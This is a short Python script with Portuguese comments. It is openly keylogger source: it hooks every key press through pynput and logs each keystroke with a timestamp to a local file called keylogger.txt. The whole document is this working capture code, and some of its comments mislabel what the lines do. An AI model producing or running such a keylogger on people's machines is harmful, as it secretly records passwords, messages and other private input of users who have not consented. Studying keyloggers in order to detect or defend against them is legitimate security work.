from pynput.keyboard import Key,Listener                # importando pynput
import logging                                          # importando diretório


log_dir=""                                              # local do diretório
logging.basicConfig(filename=(log_dir + "keylogger.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):                                      # método para receber tecla
    logging.info(str(key))
with Listener(on_press=on_press) as listener:           # método para enviar telca
    listener.join()
